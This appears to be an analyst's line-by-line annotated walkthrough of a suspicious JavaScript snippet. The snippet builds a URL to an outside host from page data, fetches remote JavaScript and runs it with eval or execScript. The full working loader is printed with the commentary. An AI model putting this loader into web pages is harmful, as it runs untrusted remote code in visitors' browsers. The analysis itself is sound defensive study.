var par = document.scripts[document.scripts.length - 2].text; //So this will assign the text in the second to last script tag on the page to par
par = par.replace('<!--', ''); // This is weird and seems like a potential obfuscation technique although I am not sure, so on the previously mentioned script tag it will remove the html comments.
par = par.replace('-->', ''); // 2x
par = par.split("-"); // This will split any part where a - occurs into an array.
var i = par[0]; // So this users the above information that was turned into an array to assign the value i to the first thing in that array.
var o = par[1]; // The second thing in the array
var u = par[2]; // and third.

function zdRndNum(n) { // This creates a random number and assigns it to rnd.
    var rnd = "";
    for (var i = 0; i < n; i++)
        rnd += Math.floor(Math.random() * 10);
    return rnd;
}

function isIE() { // Okay its identifying if this script is executed in is Internet explorer.
    if (!!window.ActiveXObject || "ActiveXObject" in window)
        return true;
    else
        return false;
}
var zdrandomnum = zdRndNum(10); //this will create a 10 digit number
if (u) { // not sure about this but if U is true then it will use this first url
    var url = "//sspapi.zenyou.71360.com/js?i=" + i + "&o=" + o + "&u=" + u + "&ran=" + zdrandomnum; // This doesn't feel legit its using those previously created array values and 10 digit number in order to create a unique identifier and create an external url which gets referenced later.
} else { // if false then it will use this one.
    var url = "//sspapi.zenyou.71360.com/js?i=" + i + "&o=" + o + "&ran=" + zdrandomnum; // This is the same doesn't feel legit.
}
var isie = isIE(); // Runs the isIE function.
if (isie) { //if it is internet explorer it will add a script meta that requests a Javascript file from that funky looking url created earlier super sketchy.
    document.write("<script src =" + url + "></script>");
} else { //if its not a Internet explorer browser that its executed it it will....
    var xhr = new XMLHttpRequest(); 
    xhr.open("GET", url, false);
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        var XMLHttpReq = xhr;
        if (XMLHttpReq.readyState == 4) {
            if (XMLHttpReq.status == 200) {
                var text = XMLHttpReq.responseText;
                if (window.execScript) {
                    window.execScript(text);
                } else {
                    window.eval(text);
                    JavaScript
                }
            }
        }
    };// This create an HTTP request using GET to the suspicious URL where it retrieve a JS file, it attempts to use execScript which I didn't know existed but is apparently used for IE but if that doesn't work they use eval for modern browsers to execute the text recieved as JavaScript.
    xhr.send(null);
}


/*
Notes
General outline of what this script is trying to achieve:
This script dynamically fetches and executes JavaScript from a suspicious external server. It starts by extracting and processing text from the second-to-last <script> tag on the page, which is split into values used to construct a unique URL. Depending on the browser (Internet Explorer or not), it either injects a <script> tag or makes an HTTP request to retrieve the JavaScript. Once the script is fetched, it executes the code using eval (or execScript for IE).
*/